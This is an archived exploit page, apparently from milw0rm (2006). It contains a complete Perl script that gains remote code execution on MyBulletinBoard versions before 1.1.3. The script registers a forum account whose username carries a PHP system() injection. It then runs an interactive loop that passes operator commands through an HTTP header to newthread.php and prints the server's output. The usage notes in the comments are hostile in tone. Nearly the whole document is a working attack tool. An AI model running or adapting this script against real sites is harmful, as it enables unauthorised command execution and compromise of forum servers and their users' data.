<html><head><title>MyBulletinBoard (MyBB) < 1.1.3 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl 
# Tue Jun 13 12:37:12 CEST 2006 jolascoaga@514.es
#
# Exploit HOWTO - read this before flood my Inbox you bitch!
#
# - First you need to create the special user to do this use:
#	./mybibi.pl --host=http://www.example.com --dir=/mybb -1
#   this step needs a graphic confirmation so the exploit writes a file 
#   in /tmp/file.png, you need to
#   see this img and put the text into the prompt. If everything is ok, 
#   you'll have a new valid user created.
# * There is a file mybibi_out.html where the exploit writes the output 
#   for debugging.
# - After you have created the exploit or if you have a valid non common 
#   user, you can execute shell commands.
#
# TIPS:
# 	* Sometimes you have to change the thread Id, --tid is your friend ;)
#	* Don't forget to change the email. You MUST activate the account.
#	* Mejor karate aun dentro ti.
#
# LIMITATIONS:
#	* If the admin have the username lenght &lt; 28 this exploit doesn't works
#
# Greetz to !dSR ppl and unsec
#
# 514 still r0xing!

# user config.
my $uservar = &quot;C&quot;; # don't use large vars.
my $password = &quot;514r0x&quot;;
my $email = &quot;514\@mailinator.com&quot;;

use LWP::UserAgent;
use HTTP::Cookies;
use LWP::Simple;
use HTTP::Request::Common &quot;POST&quot;;
use HTTP::Response;
use Getopt::Long;
use strict;

$| = 1;   # you can choose this or another one.

my ($proxy,$proxy_user,$proxy_pass, $username);
my ($host,$debug,$dir, $command, $del, $first_time, $tid);
my ($logged, $tid) = (0, 2);

$username = &quot;'.system(getenv(HTTP_&quot;.$uservar.&quot;)).'&quot;;

my $options = GetOptions (
  'host=s'	      =&gt; \$host, 
  'dir=s'	      =&gt; \$dir,
  'proxy=s'           =&gt; \$proxy,
  'proxy_user=s'      =&gt; \$proxy_user,
  'proxy_pass=s'      =&gt; \$proxy_pass,
  'debug'             =&gt; \$debug,
  '1'		      =&gt; \$first_time,
  'tid=s'	      =&gt; \$tid,
  'delete'	      =&gt; \$del);

&amp;help unless ($host); # please don't try this at home.

$dir = &quot;/&quot; unless($dir);
print &quot;$host - $dir\n&quot;;
if ($host !~ /^http/) {
	$host = &quot;http://&quot;.$host;
}

LWP::Debug::level('+') if $debug;
my ($res, $req);

my $ua = new LWP::UserAgent(
           cookie_jar=&gt; { file =&gt; &quot;$$.cookie&quot; });
$ua-&gt;agent(&quot;Mothilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!&quot;);
$ua-&gt;proxy(['http'] =&gt; $proxy) if $proxy;
$req-&gt;proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

create_user() if $first_time;

while () {
		login() if !$logged;

		print &quot;mybibi&gt; &quot;; # lost connection
		while(&lt;STDIN&gt;) {
				$command=$_;
				chomp($command);
				last;
		}
		&amp;send($command);
}

sub send  {
	chomp (my $cmd = shift);
	my $h = $host.$dir.&quot;/newthread.php&quot;;
	my $req = POST $h, [
		'subject' =&gt; '514',
		'message' =&gt; '/slap 514',
		'previewpost' =&gt; 'Preview Post',
		'action' =&gt; 'do_newthread',
		'fid' =&gt; $tid,
		'posthash' =&gt; 'e0561b22fe5fdf3526eabdbddb221caa'
	];
	$req-&gt;header($uservar =&gt; $cmd);
	print $req-&gt;as_string() if $debug;
	my $res = $ua-&gt;request($req);
	if ($res-&gt;content =~ /You may not post in this/) {
		print &quot;[!] don't have perms to post. Change the Forum ID\n&quot;;
	} else {
		my ($data) = $res-&gt;content =~ m/(.*?)\&lt;\!DOCT/is;
		print $data;
	}

}
sub login {
	my $h  = $host.$dir.&quot;/member.php&quot;;
	my $req = POST $h,[
		'username' =&gt; $username,
		'password' =&gt; $password,
		'submit' =&gt; 'Login',
		'action' =&gt; 'do_login'
	];
	my $res = $ua-&gt;request($req);
	if ($res-&gt;content =~ /You have successfully been logged/is) {
		print &quot;[*] Login succesful!\n&quot;;
		$logged = 1;
	} else {
		print &quot;[!] Error login-in\n&quot;;
	}
}

sub help {
    print &quot;Syntax: ./$0 --host=url --dir=/mybb [options] -1 --tid=2\n&quot;;
    print &quot;\t--proxy (http), --proxy_user, --proxy_pass\n&quot;;
    print &quot;\t--debug\n&quot;;
    print &quot;the default directory is /\n&quot;;
    print &quot;\nExample\n&quot;;
    print &quot;bash# $0 --host=http(s)://www.server.com/\n&quot;;
    print &quot;\n&quot;;
    exit(1);
}

sub create_user {
	# firs we need to get the img.
	my  $h = $host.$dir.&quot;/member.php&quot;;
	print &quot;Host: $h\n&quot;;

	$req = HTTP::Request-&gt;new (GET =&gt; $h.&quot;?action=register&quot;);
	$res = $ua-&gt;request ($req);

	my $req = POST $h, [
		'action' =&gt; &quot;register&quot;,
		'agree' =&gt; &quot;I Agree&quot;
	];
	print $req-&gt;as_string() if $debug;
	$res = $ua-&gt;request($req);

	my $content = $res-&gt;content();
	$content =~ m/.*(image\.php\?action.*?)\&quot;.*/is;
	my $img = $1;
	my $req = HTTP::Request-&gt;new (GET =&gt; $host.$dir.&quot;/&quot;.$img);
	$res = $ua-&gt;request ($req);
	print $req-&gt;as_string();

	if ($res-&gt;content) {
		open (TMP, &quot;&gt;/tmp/file.png&quot;) or die($!);
		print TMP $res-&gt;content;
		close (TMP);
		print &quot;[*] /tmp/file.png created.\n&quot;;
	}

	my ($hash) = $img =~ m/hash=(.*?)$/;
	my $img_str = get_img_str();
	unlink (&quot;/tmp/file.png&quot;);
	$img_str =~ s/\n//g;
	my $req = POST $h, [
		'username' =&gt; $username,
		'password' =&gt; $password,
		'password2' =&gt; $password,
		'email' =&gt; $email,
		'email2' =&gt; $email,
		'imagestring' =&gt; $img_str,
		'imagehash' =&gt; $hash,
		'allownotices' =&gt; 'yes',
		'receivepms' =&gt; 'yes',
		'pmpopup' =&gt; 'no',
		'action' =&gt; &quot;do_register&quot;,
		'regsubmit' =&gt; &quot;Submit Registration&quot;
	];
	$res = $ua-&gt;request($req);
	print $req-&gt;as_string() if $debug;

	open (OUT, &quot;&gt;mybibi_out.html&quot;);
	print OUT $res-&gt;content;

	print &quot;Check $email for confirmation or mybibi_out.html if there are some error\n&quot;;
}

sub get_img_str ()
{
	print &quot;\nNow I need the text shown in /tmp/file.png: &quot;;
	my $str = &lt;STDIN&gt;;
	return $str;
}
exit 0;

# milw0rm.com [2006-06-13]</pre></html>